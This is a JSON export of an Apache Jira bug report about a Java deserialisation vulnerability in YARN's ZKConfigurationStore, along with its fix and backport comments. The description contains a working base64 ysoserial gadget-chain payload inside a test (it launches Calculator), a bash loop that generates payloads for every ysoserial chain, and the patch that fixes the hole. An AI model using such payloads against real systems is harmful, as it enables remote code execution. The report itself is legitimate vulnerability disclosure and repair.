@@ -1,0 +1,653 @@
+{
+  "downloaded_at": "2026-06-25T10:24:58.127160+00:00",
+  "source": "Apache Jira REST API v2",
+  "issue_key": "YARN-11126",
+  "issue_url": "https://issues.apache.org/jira/rest/api/2/issue/YARN-11126?fields=id%2Ckey%2Csummary%2Cdescription%2Cparent%2Cvotes%2Ccomment%2Cattachment%2Cissuetype%2Cstatus%2Cpriority%2Cresolution%2Clabels%2Ccomponents%2Ccreated%2Cupdated%2Cissuelinks%2Csubtasks",
+  "requested_fields": [
+    "id",
+    "key",
+    "summary",
+    "description",
+    "parent",
+    "votes",
+    "comment",
+    "attachment",
+    "issuetype",
+    "status",
+    "priority",
+    "resolution",
+    "labels",
+    "components",
+    "created",
+    "updated",
+    "issuelinks",
+    "subtasks"
+  ],
+  "issue_response": {
+    "expand": "renderedFields,names,schema,operations,editmeta,changelog,versionedRepresentations",
+    "id": "13443379",
+    "self": "https://issues.apache.org/jira/rest/api/2/issue/13443379",
+    "key": "YARN-11126",
+    "fields": {
+      "summary": "ZKConfigurationStore Java deserialisation vulnerability",
+      "issuetype": {
+        "self": "https://issues.apache.org/jira/rest/api/2/issuetype/1",
+        "id": "1",
+        "description": "A problem which impairs or prevents the functions of the product.",
+        "iconUrl": "https://issues.apache.org/jira/secure/viewavatar?size=xsmall&avatarId=21133&avatarType=issuetype",
+        "name": "Bug",
+        "subtask": false,
+        "avatarId": 21133
+      },
+      "components": [
+        {
+          "self": "https://issues.apache.org/jira/rest/api/2/component/12325004",
+          "id": "12325004",
+          "name": "yarn"
+        }
+      ],
+      "subtasks": [],
+      "created": "2022-05-05T12:48:58.361+0000",
+      "description": "ZKConfigurationStore uses ObjectInputStream to deserialise objects from ZooKeeper. An attacker who *has access to ZK* can exploit this, e.g.: using [gadget chain deserialisation attacks|https://snyk.io/blog/serialization-and-deserialization-in-java/] the attacker can run arbitrary commands, even create reverse shells.\r\n\r\nA useful [CheatSheet|https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet/blob/master/README.md] for Java Deserialisation.\r\n\r\n\r\nI managed to start the Calculator app on my Mac using the following payload:\r\n{code}\r\n  //java -jar ./target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 'open /System/Applications/Calculator.app' | base64\r\n  @Test\r\n  public void testDeserializationCommonsBeanutils1() throws Exception {\r\n    deserializeObject(Base64.getDecoder().decode(\"rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABrzK/rq+AAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAob3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQANU3RhY2tNYXBUYWJsZQEAHXlzb3NlcmlhbC9Qd25lcjcwMDkwMzg1OTI5MzM5AQAfTHlzb3NlcmlhbC9Qd25lcjcwMDkwMzg1OTI5MzM5OwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAC8ADgAAAAwAAQAAAAUADwA4AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAADQADgAAACAAAwAAAAEADwA4AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAADgADgAAACoABAAAAAEADwA4AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAACQAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAEANgAAAAMAAQMAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACXVxAH4AEAAAAdTK/rq+AAAAMgAbCgADABUHABcHABgHABkBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAA0ZvbwEADElubmVyQ2xhc3NlcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHABoBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAEAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAA8AA4AAAAMAAEAAAAFAA8AEgAAAAIAEwAAAAIAFAARAAAACgABAAIAFgAQAAlwdAAEUHducnB3AQB4cQB+AA14\"));\r\n  }\r\n{code}\r\n\r\n\r\nA bash script to generate all possible attacks with [ysoserial|https://github.com/frohoff/ysoserial], attachment:  [^TestZKConfigurationStoreCVE.java] \r\n{code}\r\nfor exploit in AspectJWeaver BeanShell1 C3P0 Click1 Clojure CommonsBeanutils1 CommonsCollections1 CommonsCollections2 CommonsCollections3 CommonsCollections4 CommonsCollections5 CommonsCollections6 CommonsCollections7 FileUpload1 Groovy1 Hibernate1 Hibernate2 JBossInterceptors1 JRMPClient JRMPListener JSON1 JavassistWeld1 Jdk7u21 Jython1 MozillaRhino1 MozillaRhino2 Myfaces1 Myfaces2 ROME Spring1 URLDNS Vaadin1 Wicket1; do echo \"//java -jar ./target/ysoserial-0.0.6-SNAPSHOT-all.jar $exploit 'open /System/Applications/Calculator.app' | base64\\n@Test\\npublic void testDeserialization${exploit}() throws Exception {\\n    deserializeObject(Base64.getDecoder().decode(\\\"$(java -jar ./target/ysoserial-0.0.6-SNAPSHOT-all.jar $exploit 'open /System/Applications/Calculator.app' 2>/dev/null | base64)\\\"));\\n}\\n\"; done\r\n{code}\r\n\r\n\r\n\r\nThere are multiple ways of [Combating Java Deserialization Vulnerabilities with Look-Ahead Object Input Streams (LAOIS)|https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2017/june/ncc_group_combating_java_deserialization_vulnerabilities_with_look-ahead_object_input_streams1.pdf].\r\n\r\nMy proposal is to use the org.apache.commons.io.serialization.ValidatingObjectInputStream.\r\n{code}\r\ndiff --git a/hadoop-yarn-project/hadoop-yarn/hadoop-yarn-server/hadoop-yarn-server-resourcemanager/src/main/java/org/apache/hadoop/yarn/server/resourcemanager/scheduler/capacity/conf/ZKConfigurationStore.java b/hadoop-yarn-project/hadoop-yarn/hadoop-yarn-server/hadoop-yarn-server-resourcemanager/src/main/java/org/apache/hadoop/yarn/server/resourcemanager/scheduler/capacity/conf/ZKConfigurationStore.java\r\nindex 71226c300a8..ef8320ebc6b 100644\r\n--- a/hadoop-yarn-project/hadoop-yarn/hadoop-yarn-server/hadoop-yarn-server-resourcemanager/src/main/java/org/apache/hadoop/yarn/server/resourcemanager/scheduler/capacity/conf/ZKConfigurationStore.java\r\n+++ b/hadoop-yarn-project/hadoop-yarn/hadoop-yarn-server/hadoop-yarn-server-resourcemanager/src/main/java/org/apache/hadoop/yarn/server/resourcemanager/scheduler/capacity/conf/ZKConfigurationStore.java\r\n@@ -18,6 +18,7 @@\r\n\r\n package org.apache.hadoop.yarn.server.resourcemanager.scheduler.capacity.conf;\r\n\r\n+import org.apache.commons.io.serialization.ValidatingObjectInputStream;\r\n import org.apache.hadoop.classification.VisibleForTesting;\r\n import org.apache.zookeeper.KeeperException.NodeExistsException;\r\n import org.slf4j.Logger;\r\n@@ -314,7 +315,8 @@ private static String getNodePath(String root, String nodeName) {\r\n\r\n   private static Object deserializeObject(byte[] bytes) throws Exception {\r\n     try (ByteArrayInputStream bais = new ByteArrayInputStream(bytes);\r\n-        ObjectInputStream ois = new ObjectInputStream(bais);) {\r\n+         ValidatingObjectInputStream ois = new ValidatingObjectInputStream(bais);) {\r\n+      ois.accept(LinkedList.class, LogMutation.class, HashMap.class, String.class);\r\n       return ois.readObject();\r\n     }\r\n   }\r\n{code}\r\n\r\nHowever, *it won't protect from* [DoS|https://github.com/topolik/ois-dos/] attacks. In the future it would be nice to move away from Java Object Serialisation, ZKConfigurationStore should use some other way to store the configuration, but that involves upgrades and planning.",
+      "priority": {
+        "self": "https://issues.apache.org/jira/rest/api/2/priority/3",
+        "iconUrl": "https://issues.apache.org/jira/images/icons/priorities/major.svg",
+        "name": "Major",
+        "id": "3"
+      },
+      "resolution": {
+        "self": "https://issues.apache.org/jira/rest/api/2/resolution/1",
+        "id": "1",
+        "description": "A fix for this issue is checked into the tree and tested.",
+        "name": "Fixed"
+      },
+      "labels": [
+        "pull-request-available"
+      ],
+      "attachment": [
+        {
+          "self": "https://issues.apache.org/jira/rest/api/2/attachment/13043263",
+          "id": "13043263",
+          "filename": "TestZKConfigurationStoreCVE.java",
+          "author": {
+            "self": "https://issues.apache.org/jira/rest/api/2/user?username=tdomok",
+            "name": "tdomok",
+            "key": "tdomok",
+            "avatarUrls": {
+              "48x48": "https://issues.apache.org/jira/secure/useravatar?ownerId=tdomok&avatarId=47196",
+              "24x24": "https://issues.apache.org/jira/secure/useravatar?size=small&ownerId=tdomok&avatarId=47196",
+              "16x16": "https://issues.apache.org/jira/secure/useravatar?size=xsmall&ownerId=tdomok&avatarId=47196",
+              "32x32": "https://issues.apache.org/jira/secure/useravatar?size=medium&ownerId=tdomok&avatarId=47196"
+            },
+            "displayName": "Tamas Domok",
+            "active": true,
+            "timeZone": "Etc/UTC"
+          },
+          "created": "2022-05-05T12:49:39.573+0000",
+          "size": 129319,
+          "mimeType": "text/x-java-source",
+          "content": "https://issues.apache.org/jira/secure/attachment/13043263/TestZKConfigurationStoreCVE.java"
+        }
+      ],
+      "issuelinks": [
+        {
+          "id": "12646327",
+          "self": "https://issues.apache.org/jira/rest/api/2/issueLink/12646327",
+          "type": {
+            "id": "10030",
+            "name": "Reference",
+            "inward": "is related to",
+            "outward": "relates to",
+            "self": "https://issues.apache.org/jira/rest/api/2/issueLinkType/10030"
+          },
+          "inwardIssue": {
+            "id": "13088005",
+            "key": "YARN-6840",
+            "self": "https://issues.apache.org/jira/rest/api/2/issue/13088005",
+            "fields": {
+              "summary": "Implement zookeeper based store for scheduler configuration updates",
+              "status": {
+                "self": "https://issues.apache.org/jira/rest/api/2/status/5",
+                "description": "A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.",
+                "iconUrl": "https://issues.apache.org/jira/images/icons/statuses/resolved.png",
+                "name": "Resolved",
+                "id": "5",
+                "statusCategory": {
+                  "self": "https://issues.apache.org/jira/rest/api/2/statuscategory/3",
+                  "id": 3,
+                  "key": "done",
+                  "colorName": "green",
+                  "name": "Done"
+                }
+              },
+              "priority": {
+                "self": "https://issues.apache.org/jira/rest/api/2/priority/3",
+                "iconUrl": "https://issues.apache.org/jira/images/icons/priorities/major.svg",
+                "name": "Major",
+                "id": "3"
+              },
+              "issuetype": {
+                "self": "https://issues.apache.org/jira/rest/api/2/issuetype/7",
+                "id": "7",
+                "description": "The sub-task of the issue",
+                "iconUrl": "https://issues.apache.org/jira/secure/viewavatar?size=xsmall&avatarId=21146&avatarType=issuetype",
+                "name": "Sub-task",
+                "subtask": true,
+                "avatarId": 21146
+              }
+            }
+          }
+        },
+        {
+          "id": "12642188",
+          "self": "https://issues.apache.org/jira/rest/api/2/issueLink/12642188",
+          "type": {
+            "id": "10001",
+            "name": "dependent",
+            "inward": "is depended upon by",
+            "outward": "depends upon",
+            "self": "https://issues.apache.org/jira/rest/api/2/issueLinkType/10001"
+          },
+          "inwardIssue": {
+            "id": "13451378",
+            "key": "HADOOP-18305",
+            "self": "https://issues.apache.org/jira/rest/api/2/issue/13451378",
+            "fields": {
+              "summary": "Release Hadoop 3.3.4: minor update of hadoop-3.3.3",
+              "status": {
+                "self": "https://issues.apache.org/jira/rest/api/2/status/5",
+                "description": "A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.",
+                "iconUrl": "https://issues.apache.org/jira/images/icons/statuses/resolved.png",
+                "name": "Resolved",
+                "id": "5",
+                "statusCategory": {
+                  "self": "https://issues.apache.org/jira/rest/api/2/statuscategory/3",
+                  "id": 3,
+                  "key": "done",
+                  "colorName": "green",
+                  "name": "Done"
+                }
+              },
+              "priority": {
+                "self": "https://issues.apache.org/jira/rest/api/2/priority/3",
+                "iconUrl": "https://issues.apache.org/jira/images/icons/priorities/major.svg",
+                "name": "Major",
+                "id": "3"
+              },
+              "issuetype": {
+                "self": "https://issues.apache.org/jira/rest/api/2/issuetype/3",
+                "id": "3",
+                "description": "A task that needs to be done.",
+                "iconUrl": "https://issues.apache.org/jira/secure/viewavatar?size=xsmall&avatarId=21148&avatarType=issuetype",
+                "name": "Task",
+                "subtask": false,
+                "avatarId": 21148
+              }
+            }
+          }
+        }
+      ],
+      "comment": {
+        "comments": [
+          {
+            "self": "https://issues.apache.org/jira/rest/api/2/issue/13443379/comment/17536067",
+            "id": "17536067",
+            "author": {
+              "self": "https://issues.apache.org/jira/rest/api/2/user?username=snemeth",
+              "name": "snemeth",
+              "key": "snemeth",
+              "avatarUrls": {
+                "48x48": "https://issues.apache.org/jira/secure/useravatar?ownerId=snemeth&avatarId=33743",
+                "24x24": "https://issues.apache.org/jira/secure/useravatar?size=small&ownerId=snemeth&avatarId=33743",
+                "16x16": "https://issues.apache.org/jira/secure/useravatar?size=xsmall&ownerId=snemeth&avatarId=33743",
+                "32x32": "https://issues.apache.org/jira/secure/useravatar?size=medium&ownerId=snemeth&avatarId=33743"
+              },
+              "displayName": "Szilard Nemeth",
+              "active": true,
+              "timeZone": "Europe/Budapest"
+            },
+            "body": "Hi [~tdomok],\r\n\r\nJust committed your PR to trunk.\r\nCould you please check if this should be backported to older branches?\r\nThanks.",
+            "updateAuthor": {
+              "self": "https://issues.apache.org/jira/rest/api/2/user?username=snemeth",
+              "name": "snemeth",
+              "key": "snemeth",
+              "avatarUrls": {
+                "48x48": "https://issues.apache.org/jira/secure/useravatar?ownerId=snemeth&avatarId=33743",
+                "24x24": "https://issues.apache.org/jira/secure/useravatar?size=small&ownerId=snemeth&avatarId=33743",
+                "16x16": "https://issues.apache.org/jira/secure/useravatar?size=xsmall&ownerId=snemeth&avatarId=33743",
+                "32x32": "https://issues.apache.org/jira/secure/useravatar?size=medium&ownerId=snemeth&avatarId=33743"
+              },
+              "displayName": "Szilard Nemeth",
+              "active": true,
+              "timeZone": "Europe/Budapest"
+            },
+            "created": "2022-05-12T11:43:31.540+0000",
+            "updated": "2022-05-12T11:43:31.540+0000"
+          },
+          {
+            "self": "https://issues.apache.org/jira/rest/api/2/issue/13443379/comment/17538715",
+            "id": "17538715",
+            "author": {
+              "self": "https://issues.apache.org/jira/rest/api/2/user?username=tdomok",
+              "name": "tdomok",
+              "key": "tdomok",
+              "avatarUrls": {
+                "48x48": "https://issues.apache.org/jira/secure/useravatar?ownerId=tdomok&avatarId=47196",
+                "24x24": "https://issues.apache.org/jira/secure/useravatar?size=small&ownerId=tdomok&avatarId=47196",
+                "16x16": "https://issues.apache.org/jira/secure/useravatar?size=xsmall&ownerId=tdomok&avatarId=47196",
+                "32x32": "https://issues.apache.org/jira/secure/useravatar?size=medium&ownerId=tdomok&avatarId=47196"
+              },
+              "displayName": "Tamas Domok",
+              "active": true,
+              "timeZone": "Etc/UTC"
+            },
+            "body": "I created two PRs for branch-3.3 and branch-3.2.",
+            "updateAuthor": {
+              "self": "https://issues.apache.org/jira/rest/api/2/user?username=tdomok",
+              "name": "tdomok",
+              "key": "tdomok",
+              "avatarUrls": {
+                "48x48": "https://issues.apache.org/jira/secure/useravatar?ownerId=tdomok&avatarId=47196",
+                "24x24": "https://issues.apache.org/jira/secure/useravatar?size=small&ownerId=tdomok&avatarId=47196",
+                "16x16": "https://issues.apache.org/jira/secure/useravatar?size=xsmall&ownerId=tdomok&avatarId=47196",
+                "32x32": "https://issues.apache.org/jira/secure/useravatar?size=medium&ownerId=tdomok&avatarId=47196"
+              },
+              "displayName": "Tamas Domok",
+              "active": true,
+              "timeZone": "Etc/UTC"
+            },
+            "created": "2022-05-18T10:20:55.638+0000",
+            "updated": "2022-05-18T10:20:55.638+0000"
+          },
+          {
+            "self": "https://issues.apache.org/jira/rest/api/2/issue/13443379/comment/17541257",
+            "id": "17541257",
+            "author": {
+              "self": "https://issues.apache.org/jira/rest/api/2/user?username=iwasakims",
+              "name": "iwasakims",
+              "key": "iwasakims",
+              "avatarUrls": {
+                "48x48": "https://issues.apache.org/jira/secure/useravatar?ownerId=iwasakims&avatarId=38403",
+                "24x24": "https://issues.apache.org/jira/secure/useravatar?size=small&ownerId=iwasakims&avatarId=38403",
+                "16x16": "https://issues.apache.org/jira/secure/useravatar?size=xsmall&ownerId=iwasakims&avatarId=38403",
+                "32x32": "https://issues.apache.org/jira/secure/useravatar?size=medium&ownerId=iwasakims&avatarId=38403"
+              },
+              "displayName": "Masatake Iwasaki",
+              "active": true,
+              "timeZone": "Asia/Tokyo"
+            },
+            "body": "cherry-picked this (and HADOOP-15261 as dependency) to branch-2.10.",
+            "updateAuthor": {
+              "self": "https://issues.apache.org/jira/rest/api/2/user?username=iwasakims",
+              "name": "iwasakims",
+              "key": "iwasakims",
+              "avatarUrls": {
+                "48x48": "https://issues.apache.org/jira/secure/useravatar?ownerId=iwasakims&avatarId=38403",
+                "24x24": "https://issues.apache.org/jira/secure/useravatar?size=small&ownerId=iwasakims&avatarId=38403",
+                "16x16": "https://issues.apache.org/jira/secure/useravatar?size=xsmall&ownerId=iwasakims&avatarId=38403",
+                "32x32": "https://issues.apache.org/jira/secure/useravatar?size=medium&ownerId=iwasakims&avatarId=38403"
+              },
+              "displayName": "Masatake Iwasaki",
+              "active": true,
+              "timeZone": "Asia/Tokyo"
+            },
+            "created": "2022-05-24T04:21:54.445+0000",
+            "updated": "2022-05-24T04:21:54.445+0000"
+          },
+          {
+            "self": "https://issues.apache.org/jira/rest/api/2/issue/13443379/comment/17541261",
+            "id": "17541261",
+            "author": {
+              "self": "https://issues.apache.org/jira/rest/api/2/user?username=iwasakims",
+              "name": "iwasakims",
+              "key": "iwasakims",
+              "avatarUrls": {
+                "48x48": "https://issues.apache.org/jira/secure/useravatar?ownerId=iwasakims&avatarId=38403",
+                "24x24": "https://issues.apache.org/jira/secure/useravatar?size=small&ownerId=iwasakims&avatarId=38403",
+                "16x16": "https://issues.apache.org/jira/secure/useravatar?size=xsmall&ownerId=iwasakims&avatarId=38403",
+                "32x32": "https://issues.apache.org/jira/secure/useravatar?size=medium&ownerId=iwasakims&avatarId=38403"
+              },
+              "displayName": "Masatake Iwasaki",
+              "active": true,
+              "timeZone": "Asia/Tokyo"
+            },
+            "body": "Oops. Base64 is not available in Java 7. I reverted this once.",
+            "updateAuthor": {
+              "self": "https://issues.apache.org/jira/rest/api/2/user?username=iwasakims",
+              "name": "iwasakims",
+              "key": "iwasakims",
+              "avatarUrls": {
+                "48x48": "https://issues.apache.org/jira/secure/useravatar?ownerId=iwasakims&avatarId=38403",
+                "24x24": "https://issues.apache.org/jira/secure/useravatar?size=small&ownerId=iwasakims&avatarId=38403",
+                "16x16": "https://issues.apache.org/jira/secure/useravatar?size=xsmall&ownerId=iwasakims&avatarId=38403",
+                "32x32": "https://issues.apache.org/jira/secure/useravatar?size=medium&ownerId=iwasakims&avatarId=38403"
+              },
+              "displayName": "Masatake Iwasaki",
+              "active": true,
+              "timeZone": "Asia/Tokyo"
+            },
+            "created": "2022-05-24T04:29:59.532+0000",
+            "updated": "2022-05-24T04:29:59.532+0000"
+          },
+          {
+            "self": "https://issues.apache.org/jira/rest/api/2/issue/13443379/comment/17541268",
+            "id": "17541268",
+            "author": {
+              "self": "https://issues.apache.org/jira/rest/api/2/user?username=iwasakims",
+              "name": "iwasakims",
+              "key": "iwasakims",
+              "avatarUrls": {
+                "48x48": "https://issues.apache.org/jira/secure/useravatar?ownerId=iwasakims&avatarId=38403",
+                "24x24": "https://issues.apache.org/jira/secure/useravatar?size=small&ownerId=iwasakims&avatarId=38403",
+                "16x16": "https://issues.apache.org/jira/secure/useravatar?size=xsmall&ownerId=iwasakims&avatarId=38403",
+                "32x32": "https://issues.apache.org/jira/secure/useravatar?size=medium&ownerId=iwasakims&avatarId=38403"
+              },
+              "displayName": "Masatake Iwasaki",
+              "active": true,
+              "timeZone": "Asia/Tokyo"
+            },
+            "body": "I pushed the backport to branch-2.10 again using org.apache.commons.codec.binary.Base64 instead of java.util.Base64.",
+            "updateAuthor": {
+              "self": "https://issues.apache.org/jira/rest/api/2/user?username=iwasakims",
+              "name": "iwasakims",
+              "key": "iwasakims",
+              "avatarUrls": {
+                "48x48": "https://issues.apache.org/jira/secure/useravatar?ownerId=iwasakims&avatarId=38403",
+                "24x24": "https://issues.apache.org/jira/secure/useravatar?size=small&ownerId=iwasakims&avatarId=38403",
+                "16x16": "https://issues.apache.org/jira/secure/useravatar?size=xsmall&ownerId=iwasakims&avatarId=38403",
+                "32x32": "https://issues.apache.org/jira/secure/useravatar?size=medium&ownerId=iwasakims&avatarId=38403"
+              },
+              "displayName": "Masatake Iwasaki",
+              "active": true,
+              "timeZone": "Asia/Tokyo"
+            },
+            "created": "2022-05-24T05:03:21.642+0000",
+            "updated": "2022-05-24T05:03:21.642+0000"
+          },
+          {
+            "self": "https://issues.apache.org/jira/rest/api/2/issue/13443379/comment/17541281",
+            "id": "17541281",
+            "author": {
+              "self": "https://issues.apache.org/jira/rest/api/2/user?username=iwasakims",
+              "name": "iwasakims",
+              "key": "iwasakims",
+              "avatarUrls": {
+                "48x48": "https://issues.apache.org/jira/secure/useravatar?ownerId=iwasakims&avatarId=38403",
+                "24x24": "https://issues.apache.org/jira/secure/useravatar?size=small&ownerId=iwasakims&avatarId=38403",
+                "16x16": "https://issues.apache.org/jira/secure/useravatar?size=xsmall&ownerId=iwasakims&avatarId=38403",
+                "32x32": "https://issues.apache.org/jira/secure/useravatar?size=medium&ownerId=iwasakims&avatarId=38403"
+              },
+              "displayName": "Masatake Iwasaki",
+              "active": true,
+              "timeZone": "Asia/Tokyo"
+            },
+            "body": "and to branch-2.10.2.",
+            "updateAuthor": {
+              "self": "https://issues.apache.org/jira/rest/api/2/user?username=iwasakims",
+              "name": "iwasakims",
+              "key": "iwasakims",
+              "avatarUrls": {
+                "48x48": "https://issues.apache.org/jira/secure/useravatar?ownerId=iwasakims&avatarId=38403",
+                "24x24": "https://issues.apache.org/jira/secure/useravatar?size=small&ownerId=iwasakims&avatarId=38403",
+                "16x16": "https://issues.apache.org/jira/secure/useravatar?size=xsmall&ownerId=iwasakims&avatarId=38403",
+                "32x32": "https://issues.apache.org/jira/secure/useravatar?size=medium&ownerId=iwasakims&avatarId=38403"
+              },
+              "displayName": "Masatake Iwasaki",
+              "active": true,
+              "timeZone": "Asia/Tokyo"
+            },
+            "created": "2022-05-24T05:49:40.149+0000",
+            "updated": "2022-05-24T05:49:40.149+0000"
+          }
+        ],
+        "maxResults": 6,
+        "total": 6,
+        "startAt": 0
+      },
+      "votes": {
+        "self": "https://issues.apache.org/jira/rest/api/2/issue/YARN-11126/votes",
+        "votes": 0,
+        "hasVoted": false
+      },
+      "updated": "2024-01-28T05:28:50.561+0000",
+      "status": {
+        "self": "https://issues.apache.org/jira/rest/api/2/status/5",
+        "description": "A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.",
+        "iconUrl": "https://issues.apache.org/jira/images/icons/statuses/resolved.png",
+        "name": "Resolved",
+        "id": "5",
+        "statusCategory": {
+          "self": "https://issues.apache.org/jira/rest/api/2/statuscategory/3",
+          "id": 3,
+          "key": "done",
+          "colorName": "green",
+          "name": "Done"
+        }
+      }
+    }
+  },
+  "comments_response": {
+    "total": 6,
+    "comments": [
+      {
+        "self": "https://issues.apache.org/jira/rest/api/2/issue/13443379/comment/17536067",
+        "id": "17536067",
+        "author": {
+          "self": "https://issues.apache.org/jira/rest/api/2/user?username=snemeth",
+          "name": "snemeth",
+          "key": "snemeth",
+          "avatarUrls": {
+            "48x48": "https://issues.apache.org/jira/secure/useravatar?ownerId=snemeth&avatarId=33743",
+            "24x24": "https://issues.apache.org/jira/secure/useravatar?size=small&ownerId=snemeth&avatarId=33743",
+            "16x16": "https://issues.apache.org/jira/secure/useravatar?size=xsmall&ownerId=snemeth&avatarId=33743",
+            "32x32": "https://issues.apache.org/jira/secure/useravatar?size=medium&ownerId=snemeth&avatarId=33743"
+          },
+          "displayName": "Szilard Nemeth",
+          "active": true,
+          "timeZone": "Europe/Budapest"
+        },
+        "body": "Hi [~tdomok],\r\n\r\nJust committed your PR to trunk.\r\nCould you please check if this should be backported to older branches?\r\nThanks.",
+        "updateAuthor": {
+          "self": "https://issues.apache.org/jira/rest/api/2/user?username=snemeth",
+          "name": "snemeth",
+          "key": "snemeth",
+          "avatarUrls": {
+            "48x48": "https://issues.apache.org/jira/secure/useravatar?ownerId=snemeth&avatarId=33743",
+            "24x24": "https://issues.apache.org/jira/secure/useravatar?size=small&ownerId=snemeth&avatarId=33743",
